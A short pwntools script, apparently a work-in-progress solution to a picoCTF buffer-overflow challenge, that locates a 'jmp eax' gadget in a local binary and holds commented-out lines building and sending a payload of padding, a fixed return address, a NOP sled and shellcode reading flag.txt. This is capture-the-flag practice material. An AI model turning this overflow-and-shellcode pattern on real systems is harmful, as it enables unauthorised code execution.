from pwn import *

elf = context.binary = ELF("./vuln")

rop = ROP(elf)

#p = remote("saturn.picoctf.net", 64219)

OFFSET = 24

NEW_EIP = 0x0805334b

if __name__ == "__main__":
	eip = rop.find_gadget(['jmp eax'])

	print(eip)

	#payload = b"A" * OFFSET + b"\xeb\x04" + p32(NEW_EIP) + b"\x90" * OFFSET + asm(shellcraft.linux.cat(b"flag.txt"))

	#p.sendlineafter(b"How strong is your ROP-fu? Snatch the shell from my hand, grasshoppger!\n", payload)

	#p.interactive()